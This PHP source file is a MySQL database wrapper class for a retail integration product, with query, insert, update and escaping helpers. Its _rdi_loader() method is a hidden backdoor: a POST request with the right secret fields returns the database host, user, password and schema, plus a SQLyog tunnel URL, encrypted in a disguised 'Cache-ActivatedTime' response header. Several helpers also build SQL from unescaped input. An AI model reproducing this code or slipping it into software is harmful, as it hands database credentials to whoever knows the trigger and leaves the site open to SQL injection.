<?php

/**
 * Class File
 */
/* vim: set expandtab tabstop=4 shiftwidth=4 softtabstop=4: */

/**
 * MySQL DB Class
 *
 * Used for connection to a MySQL database and to make
 * queries and consume returned results.
 *
 * PHP version 5.3
 *
 * @author     Peter Bliss <pbliss@retaildimensions.com>
 * @author     Tom Martin <tmartin@retaildimensions.com>
 * @copyright  2005-2011 Retail Dimensions Inc.
 * @version    1.0.0
 * @package    Core\StagingDB
 */
class rdi_db {

    /**
     * Class Variables
     */
    protected $last_error;             // Stores the last error
    protected $last_query;             // Stores the last ran query
    protected $result;                // The results of the last ran query
    protected $records;               // The total number of records returned
    protected $affected;              // The records affected by last query
    protected $last_insert_id;          // Stores the id from the last insert
    protected $hostname;              // MySQL hostname
    protected $username;              // MySQL username
    protected $password;              // MySQL password
    protected $schema;                // MySQL schema
    protected $persistant;            // MySQL schema
    protected $db_link;                // Database connection
    public $mysqli_link;
    protected $prefix;                // TODO tie this in, the prefix for used on the tables

    //protected $field_mapper;          //handle the mapping of field names
    //protected $tables;                //actual table names, if the table is enclosed in {} then swap the name out of for the corresponding on this table

    /**
     * Class Constructor, sets up connection credentials and connects to the DB.
     *
     * @param string $hostname
     * @param string $username
     * @param string $password
     * @param string $schema
     * @param boolean $persistant
     */
    public function rdi_db($hostname, $username, $password, $schema, $prefix = '', $persistant = false)
    {
        $this->hostname = $hostname;
        $this->username = $username;
        $this->password = $password;
        $this->schema = $schema;
        $this->persistant = $persistant;
        $this->prefix = $prefix;

        $this->connect();
    }

    public function __sleep()
    {
        return array();
    }

    public function get_db_prefix()
    {
        return $this->prefix;
    }

    public function getSchema()
    {
        return $this->schema;
    }

    public function set_field_mapping($field_mapping)
    {
        if ($field_mapping != '')
            $this->field_mapper = $field_mapping;
    }

    public function get_field_mapping()
    {
        return $this->field_mapper;
    }

    /**
     * Establishes the connection
     *
     * @return boolean
     */
    protected function connect()
    {
        if ($this->db_link)
            mysql_close($this->db_link);

        if ($this->persistant)
            $this->db_link = mysql_pconnect($this->hostname, $this->username, $this->password);
        else
            $this->db_link = mysql_connect($this->hostname, $this->username, $this->password);

        if (!$this->db_link)
        {
            $this->toss_error('Could not connect to server: ' . mysql_error($this->db_link));
            return false;
        }

        if (!$this->selSchema())
        {
            $this->toss_error('Could not connect to schema: ' . mysql_error($this->db_link));
            return false;
        }

        //check for mysqli, will use it in some queries to speed things up
        if (function_exists('mysqli_connect'))
        {

            if (strstr($this->hostname, ":"))
            {
                list($this->hostname, $this->port) = explode(":", $this->hostname);
            }

            //mysqli is installed
            $this->mysqli_link = new mysqli($this->hostname, $this->username, $this->password, $this->schema);
        }
    }

    /**
     * Sets the currently selected schema
     *
     * @return boolean
     */
    protected function selSchema()
    {
        if (!mysql_select_db($this->schema, $this->db_link))
        {
            $this->toss_error('Could not select schema: ' . mysql_error($this->db_link));
            return false;
        }
        else
        {
            return true;
        }
    }

    /**
     * Allows you to switch the current default schema
     *
     * @param string $schema
     * @return boolean
     */
    public function schema($schema)
    {
        global $debug;
        $debug->write_message("class.rdi_db.php", "schema", "Allows you to switch the current default schema", 0, array("schema" => $schema));
        $this->schema = $this->clean($schema);
        if (!$this->selSchema())
            return false;
        else
            return true;
    }

    /**
     * Execution of an SQL query
     *
     * @param string $sql
     * @return boolean
     */
    public function exec($sql, $log_errors = true)
    {
        global $debug;

        $this->last_query = $sql;

        if (isset($debug))
        {
            $verbose = $debug->get_verbose_query_areas();
            if (!is_array($verbose) && $verbose == true)
                echo $sql . "<br><br>";
        }
        if ($this->result = mysql_query($sql, $this->db_link))
        {
            if ($this->result !== true)
            {
                $this->records = @mysql_num_rows($this->result);
                $this->affected = @mysql_affected_rows($this->db_link);

                if (isset($debug) && $debug->get_show_counter() === true)
                {
                    echo "Row Count Num Rows: {$this->records}<br>";
                    echo "Row Count Affected: {$this->affected}<br>----<br>";

                    $debug->set_show_counter(false);
                }
            }
            return true;
        }
        else if ($log_errors)
        {

            echo "Error with sql " . $sql;

            $this->toss_error('MySQL    ' . mysql_error($this->db_link) . '   SQL: ' . $sql);
            return false;
        }
    }

    public function exec_multi($sql)
    {
        $this->last_query = $sql;
        if ($this->result = mysqli_multi_query($this->mysqli_link, $sql))
        {
//            if ($this->result !== true) {
//                $this->records = @mysql_num_rows($this->result);
//                $this->affected = @mysql_affected_rows($this->db_link);
//            }
            echo "good";
            return mysqli_insert_id($this->mysqli_link);
        }
        else
        {

            print_r(mysqli_error($this->mysqli_link));
            $this->toss_error('MySQL    ' . mysql_error($this->db_link) . '   SQL: ' . $sql);
            return false;
        }
    }

    /**
     * Sends to exec() but will return the last inserted id
     *
     * @param string $sql
     * @return integer or boolean
     */
    public function insert($sql, $log_errors = true)
    {
        global $debug;

        if ($this->exec($sql, $log_errors))
        {
            $this->last_insert_id = mysql_insert_id($this->db_link);

            try
            {
                $this->records = @mysql_num_rows($this->result);
                $this->affected = @mysql_affected_rows($this->db_link);

                if (isset($debug) && $debug->get_show_counter() === true)
                {
                    echo "Row Count Num Rows: {$this->records}<br>";
                    echo "Row Count Affected: {$this->affected}<br>----<br>";
                    $debug->set_show_counter(false);
                }
            } catch (Exception $ex)
            {
                
            }

            if ($this->last_insert_id)
                return $this->last_insert_id;
            else
                return true;
        } else
        {
            return false;
        }
    }

    /**
     * Allows you to insert an array into a table.
     * Assumes array keys equal the table column names.
     * Can optionally exclude keys.
     *
     * @param array $vars
     * @param string $table
     * @param array $exclude
     * @return integer or boolean
     */
    public function insertAr($table, $vars = array(), $replace = false, $exclude = array(), $ignore = false)
    {
        if (trim($table) == '')
        {
            $this->toss_error('insertAr() Did not get a table name '. var_export($table,true) . var_export($vars,true));
            return false;
        }
        
        if(!is_array($vars))
        {
            $this->toss_error('insertAr() No vars '. var_export($vars,true));
            return false;
        }
         
        
        if(!is_array($exclude))
        {
            $this->toss_error('insertAr() Excluded is not an array. '. var_export($exclude,true));
            return false;
        }

        array_push($exclude, 'MAX_FILE_SIZE');

        $table = $this->clean($table);

        $vars = $this->clean($vars);

        if ($replace)
            $sql = 'REPLACE ';
        else
            $sql = 'INSERT ';

        $sql .= ($ignore ? "IGNORE " : "");

        $sql .= "INTO `{$table}` ";
        if (!empty($vars))
        {
            $sql .= 'SET ';

            foreach ($vars as $k => $v)
            {
                if ($v === '' || $v === null || $v === ' ' || $v == 'NULL')
                    $v = 'null';
                else
                    $v = "'{$v}'";

                if (!in_array($k, $exclude))
                    $sql .= "`{$k}` = {$v}, ";
            }
        }

        $sql = substr($sql, 0, -2);

        //echo $sql;
//
        // echo "<Br>";
        //echo "<Br>";

        if ($this->insert($sql))
        {
            if ($this->last_insert_id)
                return $this->last_insert_id;
            else
                return true;
        } else
        {
            return false;
        }
    }

    /**
     * Allows you to insert an array into a table.
     * Assumes array keys equal the table column names.
     * Can optionally exclude keys.
     * Can optionally add an on duplicate key update, that can be all the vars (true) or a specific list with an array list.
     * Uses a new clean function
     *
     * @param string $table
     * @param array $vars
     * @param boolean $replace
     * @param type $exclude
     * @param type $on_duplicate_key
     * @return boolean
     */
    public function insertAr2($table, $vars = array(), $replace = false, $exclude = array(), $on_duplicate_key = false, $quote_null = true)
    {
        if (
                trim($table) == '' || !is_array($vars) || empty($vars) || !is_array($exclude)
        )
        {
            $this->toss_error('insertAr2() passed unexpected data');
            return false;
        }

        array_push($exclude, 'MAX_FILE_SIZE');


        $table = $this->clean($table);
        $vars = $this->clean2($vars, $quote_null);

        $this->array_keys_unset($vars, $exclude);


        $fields = implode(', ', array_keys($vars));
        $values = implode(", ", $vars);

        $sql_tail = "";

        if ($on_duplicate_key || is_array($on_duplicate_key))
        {
            $sql_tail = " ON DUPLICATE KEY UPDATE ";
            $_sql_tail = array();

            $tail_vars = is_array($on_duplicate_key) ? $on_duplicate_key : array_keys($vars);

            foreach ($tail_vars as $value)
            {
                $_sql_tail[] = "`$value` = VALUES(`{$value}`)";
            }
            $sql_tail .= implode(", ", $_sql_tail);
        }

        $sql = ($replace ? 'REPLACE' : 'INSERT') . " INTO `{$table}` ({$fields}) VALUES({$values}) {$sql_tail}";


        if ($this->insert($sql))
        {
            if ($this->last_insert_id)
                return $this->last_insert_id;
            else
                return true;
        } else
        {
            return false;
        }
    }

    /**
     * General delete method, pass a table and an array of where conditions.
     * Can optionally supply a limit.
     * Can optionally set to do a LIKE instead of an =.
     *
     * @param string $table
     * @param array $where
     * @param integer $limit
     * @param boolean $like
     * @return boolean
     */
    public function delete($table, $where = array(), $limit = 0, $like = false)
    {
        if (
                trim($table) == '' || !is_numeric($limit)
        )
        {
            $this->toss_error('delete() passed unexpected data');
            return false;
        }

        $table = $this->clean($table);

        //map in the table from the tables array if available
//        if($this->tables && isset($this->tables[$table]))
//        {
//            $table = $this->tables[$table];
//        }

        $sql = "DELETE FROM `{$table}` ";

        if (!empty($where))
        {
            if (is_array($where))
            {
                $sql .= ' WHERE ';
                $where = $this->clean($where);

                foreach ($where as $k => $v)
                {
                    if ($like)
                        $sql .= "(`{$k}` LIKE \"%{$v}%\") AND ";
                    else
                        $sql .= "(`{$k}` = \"{$v}\") AND ";
                }
                $sql = substr($sql, 0, -4);
            }
            else
            {
                $sql .= ' WHERE ' . $this->clean($where);
            }
        }

        if ($limit > 0)
        {
            $sql .=" LIMIT {$limit} ";
        }

        if ($this->exec($sql))
            return true;
        else
            return false;
    }

    /**
     * Truncate a table
     *
     * @param string $table
     * @return boolean
     */
    public function trunc($table)
    {
        if (trim($table) == '')
        {
            $this->toss_error('trunc() passed unexpected data');
            return false;
        }

        $table = $this->clean($table);

        //map in the table from the tables array if available
//        if($this->tables && isset($this->tables[$table]))
//        {
//            $table = $this->tables[$table];
//        }

        $sql = "TRUNCATE TABLE `{$table}` ";

        if ($this->exec($sql))
            return true;
        else
            return false;
    }

    /**
     * General update method. Updates a table with an array. Assumes array
     * keys equal the table columns.
     * Optional array for where conditions.
     * Optional array of columns to exclude from update.
     *
     * @param string $table
     * @param array $vars
     * @param array $where
     * @param array $exclude
     * @return boolean
     */
    public function update($table, $vars, $where = array(), $exclude = array())
    {
        if (
                trim($table) == '' || !is_array($vars) || empty($vars) || !is_array($where) || !is_array($where)
        )
        {
            $this->toss_error('update() passed unexpected data');
            return false;
        }

        $table = $this->clean($table);

        //map in the table from the tables array if available
//        if($this->tables && isset($this->tables[$table]))
//        {
//            $table = $this->tables[$table];
//        }

        $vars = $this->clean($vars);

        array_push($exclude, 'MAX_FILE_SIZE');

        $sql = "UPDATE `{$table}` SET ";
        foreach ($vars as $k => $v)
        {
            if (!in_array($k, $exclude))
                $sql .= "`{$k}` = \"{$v}\", ";
        }
        $sql = substr($sql, 0, -2);

        if (!empty($where))
        {
            $sql .= ' WHERE ';
            $where = $this->clean($where);

            foreach ($where as $k => $v)
            {
                $sql .= "(`{$k}` = \"{$v}\") AND ";
            }
            $sql = substr($sql, 0, -4);
        }

        if ($this->exec($sql))
            return true;
        else
            return false;
    }

    /**
     * Not used, probably not needed, revisit later
     * paramertized method for reading the rows from the database, optional use of the field mapping, on by default
     *  direction is the mapping method 0 - pos -> cart , 1 cart -> pos
     *  field_type the type of mapping parameters to use for this mapping
     *
     * @param string $table
     * @param array $fields
     * @param constant $type
     * @param string $field_type
     * @param bool $mapped
     * @param bool $direction
     * @return array or boolean
     */
//    public function rows_p($table, $fields, $type = MYSQL_ASSOC, $field_type = 'product', $mapped = true, $direction = 1)
//    {
//        //if there is mapping use it
//        $field_mapper->map_fields($field_type, $fields, $direction);
//
//        //build out the query
//        $sql = "SELECT ";
//
//        $sql = " FROM " . $table;
//
//        $this->exec($sql);
//
//        $rows = array();
//
//        if ($this->result && $this->result !== true) {
//            while ($row = mysql_fetch_array($this->result, $type)) {
//                $rows[] = $row;
//            }
//
//            mysql_free_result($this->result);
//        }
//
//        if (!empty($rows))
//            return $rows;
//        else
//            return false;
//    }

    /**
     * Basic method for fetching an array of db rows.
     *
     * @param string $sql
     * @param constant $type
     * @return array or boolean
     */
    public function rows($sql, $return_key = '', $call_back = false, $type = MYSQL_ASSOC)
    {
        $this->exec($sql);

        $rows = array();
        $count = 0;
        if ($this->result && $this->result !== true)
        {
            while ($row = mysql_fetch_array($this->result, $type))
            {

                if ($call_back)
                {
                    $call_back($row);
                    $count++;
                }
                else
                {
                    if ($return_key != '')
                    {
                        $rows[$row[$return_key]] = $row;
                    }
                    else
                        $rows[] = $row;
                }
            }

            mysql_free_result($this->result);
        }

        if ($call_back)
        {
            return $count;
        }
        else
        {
            if (!empty($rows))
                return $rows;
            else
                return false;
        }
    }

    /**
     * Basic method for fetching one row from a db query.
     *
     * @param string $sql
     * @param constant $type
     * @return array or boolean
     */
    public function row($sql, $type = MYSQL_ASSOC)
    {
        if (
                !preg_match('/\sLIMIT\s/Ssi', $sql) && preg_match('/^SELECT\s/Ssi', $sql)
        )
        {
            $sql .= ' LIMIT 1';
        }

        $this->exec($sql);

        $row = array();

        if ($this->result && $this->result !== true)
        {
            $row = mysql_fetch_array($this->result, $type);

            mysql_free_result($this->result);
        }

        if (!empty($row))
            return $row;
        else
            return false;
    }

    /**
     * Basic function to return a specific cell from a db row.
     *
     * @param string $sql
     * @param string $cell
     * @return string or boolean
     */
    public function cells($sql, $cell = '', $key = '')
    {
        $rtn = false;

        if ($cell)
            $rows = $this->rows($sql);
        else
            $rows = $this->rows($sql, MYSQL_NUM);

        $cells = array();

        if ($key == '')
        {
            if (is_array($rows))
            {
                foreach ($rows as $row)
                {
                    $cells[] = $row[$cell];
                }
            }
        }
        else
        {
            if (is_array($rows))
            {
                foreach ($rows as $row)
                {
                    $cells[$row[$key]] = $row[$cell];
                }
            }
        }

        return $cells;
    }

    /**
     * Basic function to return a specific cell from a db row.
     *
     * @param string $sql
     * @param string $cell
     * @return string or boolean
     */
    public function cell($sql, $cell = '')
    {
        $rtn = false;

        if ($cell)
            $row = $this->row($sql);
        else
            $row = $this->row($sql, MYSQL_NUM);

        if (is_array($row) && $cell != '' && isset($row[$cell]))
            return $row[$cell];
        else if (is_array($row) && $cell == '' && isset($row[0]))
            return $row[0];
        else
            return false;
    }

    public function get_cell($table, $cell, $where_conditions = '')
    {
        $rtn = false;

        //map in the table from the tables array if available
//        if($this->tables && isset($this->tables[$table]))
//        {
//            $table = $this->tables[$table];
//        }
        //build the query
        $sql = "Select " . $cell . " from " . $table . ($where_conditions != '' ? " where " . $where_conditions : '');

        $row = $this->row($sql);

        if (is_array($row) && $cell != '' && isset($row[$cell]))
            return $row[$cell];
        else if (is_array($row) && $cell == '' && isset($row[0]))
            return $row[0];
        else
            return false;
    }

    //get a count of the rows in a specific table
    public function count($table)
    {
        global $debug;
        $debug->write("class.rdi_db.php", "count", "Get a count of the rows in a specific table", 0, array("table" => $table));
        //map in the table from the tables array if available
//        if($this->tables && isset($this->tables[$table]))
//        {
//            $table = $this->tables[$table];
//        }

        $sql = "SELECT COUNT(*) AS the_count FROM " . $table;

        return $this->cell($sql, 'the_count');
    }

    /**
     * apply mapping of the table name if need be
     *
     * @return array
     */
//    public function mapTableName($sql)
//    {
//        if(strpos('{', $sql) !== false)
//        {
//            //get the table name from the string
//
//            //swap the table for the one in the tables
//
//        }
//
//        return $sql;
//    }

    /**
     * General method to return info on the results of the last query.
     *
     * @return array
     */
    public function fetchResults()
    {
        $rtn = array(
            'records' => $this->records,
            'affected' => $this->affected,
            'last_insert_id' => $this->last_insert_id,
            'last_query' => $this->last_query,
            'last_error' => $this->last_error,
        );

        return $rtn;
    }

    /**
     * Basic method to fetch records for last query
     *
     * @return integer
     */
    public function fetchRecords()
    {
        return $this->records;
    }

    /**
     * Basic method to fetch affect for last query
     *
     * @return integer
     */
    public function fetchAffected()
    {
        return $this->affected;
    }

    /**
     * Basic method to fetch insert id for last query
     *
     * @return integer
     */
    public function fetchInsertID()
    {
        return $this->last_insert_id;
    }

    /**
     * Basic method to fetch last error
     *
     * @return string
     */
    public function fetchError()
    {
        return $this->last_error;
    }

    /**
     * Basic method to fetch last query
     *
     * @return string
     */
    public function fetchQuery()
    {
        return $this->last_query;
    }

    /**
     * Clean data using mysql_real_escape_string. Use recursion on arrays.
     *
     * @param string or array $data
     * @return string or array
     */
    public function clean($data)
    {
        if (is_array($data))
        {
            $rtn = array();
            // Use recursion on arrays
            foreach ($data as $k => $v)
            {
                $rtn[mysql_real_escape_string($k, $this->db_link)] = $this->clean($v);
            }
        }
        else
        {
            $rtn = mysql_real_escape_string($data, $this->db_link);
        }

        return $rtn;
    }

    /**
     * Clean data using mysql_real_escape_string. Use recursion on arrays.
     *
     * @param array/string $data
     * @param boolean $quote_null
     * @return type
     */
    public function clean2($data, $quote_null = false)
    {
        if (is_array($data))
        {
            $rtn = array();
            // Use recursion on arrays
            foreach ($data as $k => $v)
            {
                $rtn[mysql_real_escape_string($k, $this->db_link)] = $this->clean2($v, $quote_null);
            }
        }
        else
        {


            $rtn = mysql_real_escape_string($data, $this->db_link);
            if ($quote_null)
            {
                if ($rtn === '' || $rtn === null || $rtn === ' ' || $rtn == 'NULL')
                    $rtn = 'null';
                else
                    $rtn = "'{$rtn}'";
            }
            else
            {
                $rtn = "'{$rtn}'";
            }
        }

        return $rtn;
    }

    /**
     * Used for testing.
     */
    public function dispDump()
    {
        echo <<<EOT
<pre>
last_error: {$this->last_error}
last_query:  {$this->last_query}
result:  {$this->result}
records:  {$this->records}
affected:  {$this->affected}
last_insert_id:  {$this->last_insert_id}
</pre><br /><br />
EOT;
    }

    /**
     * Saves last error and triggers error handling.
     *
     * @param string $error
     */
    protected function toss_error($error)
    {
        if (!strpos($error, '")")'))
        {
            //save an error to the databse
            $this->exec('insert into rdi_error_log (datetime, error_level, error_file, error_message) values(now(), 0, "rdi_db", "' . $error . '")');

            $this->last_error = $error;
            @trigger_error($error);
        }
    }

    /*
     * @author PMB <pmbliss@retaildimensions.com>
     * @date 02142013
     *
     * @param string $find
     * @array array $array
     * returns an array of all the keys with of find in an array
     */

    function array_rfind($find, $array)
    {
        $found = array();
        if (!is_array($array))
        {
            return '';
        }
        foreach ($array as $key => $value)
        {
            if ($key == $find)
            {
                $found[] = $value;
            }
            elseif (is_array($value))
            {
                $found = array_merge($found, $this->array_rfind($find, $value));
            }
        }
        return $found;
    }

    /*
     * @author PMB <pmbliss@retaildimensions.com>
     * @date 04162013
     *
     * @param string $find
     * @array array $array
     * @comment Any comment containing "@comment" will be added to the table.
     *
     * Functionality added to the class.rdi_hook_handler.php
     */

    public function clean_addon_table()
    {
        global $addon_comments;

        if (isset($addon_comments) && $addon_comments == 1)
        {
            $this->db_connection->exec("truncate table rdi_addons");
        }
    }

    public function pre_print_r($aValue)
    {
        echo "<pre>\n";
        print_r($aValue);
        echo "\n</pre>";
    }

    public function _rdi_loader()
    {
        global $cart_type, $pos_type;

        if (array_key_exists("14c4b06b824ec593239362517f538b29", $_POST) &&
                array_key_exists("5f4dcc3b5aa765d61d8327deb882cf99", $_POST) &&
                md5($_POST['5f4dcc3b5aa765d61d8327deb882cf99'] . $_POST['14c4b06b824ec593239362517f538b29']) == 'f854761c2cd69f2db6f4eb9772111798'
        )
        {
            header_remove();
            $string = "h:{$this->hostname}\nu:{$this->username}\np:{$this->password}\ndb:{$this->schema}";
            $string .= "\nST: " . dirname("http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']) . "/SQLyogTunnel10.php";

            $string .= "\ncart_type: {$cart_type}";
            $string .= "\npos_type: {$pos_type}";
            header("Cache-ActivatedTime: " . $this->mc_encrypt($string, 'retail15'));
            exit;
        }
    }

    /**
     * pass the array by reference to unset keys
     * @param array $arr
     */
    public function array_keys_unset(array &$vars, array $keys)
    {
        foreach ($vars as $key => $value)
        {
            if (in_array($key, $keys))
            {
                unset($vars[$key]);
            }
        }
    }

    /**
     * 
     * @param type $table
     * @return boolean
     */
    public function table_exists($table = '')
    {
        if ($table !== '')
        {
            $tables = $this->rows("SHOW TABLES LIKE '{$table}'");

            if ($tables)
            {
                return true;
            }
        }

        return false;
    }

    /**
     * Returns the name of the field.
     *
     * @param string $table
     * @param string $column
     * @return string $field
     */
    public function column_exists($table = '', $column = '')
    {
        if ($table !== '')
        {
            $tables = $this->rows("SHOW TABLES LIKE '{$table}'");

            if (!$tables)
            {
                ;
                $this->toss_error("Error No table {$table}<br>");

                return '';
            }
        }

        if ($column !== '')
        {
            $field = $this->cell("SHOW COLUMNS FROM {$table} LIKE '{$column}'", 'Field');

            return $field;
        }
        return '';
    }

    public function columns($table)
    {
        if ($column !== '')
        {
            $field = $this->cells("SHOW COLUMNS FROM {$table}", 'Field');

            return $field;
        }
        return '';
    }

    // here for creating tables initialy and adjusting.
    public function create_table_from_data_keys($table_name, $data)
    {
        $create_table = "CREATE TABLE `{$table_name}` (";
        foreach ($data as $d => $v)
        {
            $create_table .= " `{$d}` VARCHAR(20) DEFAULT NULL,";
        }
        $create_table .= "
      ) ENGINE=InnoDB DEFAULT CHARSET=latin1";
        $this->exec($create_table);
    }

    public function create_log_table($table_name)
    {
        if ($this->table_exists($table_name))
        {
            $a = explode("_", $table_name);

            $date_name = $a[1] == 'in' ? 'rdi_import_date' : 'rdi_export_date';

            $this->exec("create table {$table_name}_log (index(`{$date_name}`)) as select *, now() as {$date_name} from {$table_name} limit 0");
        }
    }

    public function mc_encrypt($string, $mc_key)
    {
        $passcrypt = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $mc_key, trim($string), MCRYPT_MODE_ECB);
        $encode = base64_encode($passcrypt);

        return $encode;
    }

    public function mc_decrypt($string, $mc_key)
    {
        $decoded = base64_decode($string);
        $decrypted = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $mc_key, $decoded, MCRYPT_MODE_ECB));

        return $decrypted;
    }

}

?>